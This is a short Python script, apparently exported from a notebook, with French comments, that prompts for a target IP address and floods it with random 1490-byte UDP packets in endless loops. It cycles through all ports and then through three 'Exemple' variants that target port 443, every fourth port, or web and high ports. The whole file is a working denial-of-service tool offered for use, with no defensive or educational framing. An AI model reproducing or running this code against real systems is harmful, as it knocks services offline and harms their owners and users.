#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import socket
import random

site = input("IP a attaquer : ")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

port = 1
sent = 0

while True:
    print(port)
    sock.sendto(bytes, (site, port))
    sent = sent + 1
    port = port + 1
    invite = port + 1
    if port == 65534:
        port = 1


        
# Exemple 1

def attaque(site, port):
        sock.sendto(bytes, (site,port))

port=443
while True:
    attaque(site,port)
    
# Exemple 2

def attaque2(site, port):
    if port%4==0:
        sock.sendto(bytes, (site,port))
    else:
        pass

port=1
while True:
    attaque2(site, port)
    port = port + 1
    if port == 65534:
        port = 1
        
# Exemple 3

def attaque3(site, port):
    if port==80 or port==443:
        sock.sendto(bytes, (site,port))
    elif (port>1024) and (port%4==0):
        sock.sendto(bytes, (site,port))
    else:
        pass

port=1
while True:
    attaque3(site, port)
    port +=1
    if port == 65534:
        port = 1

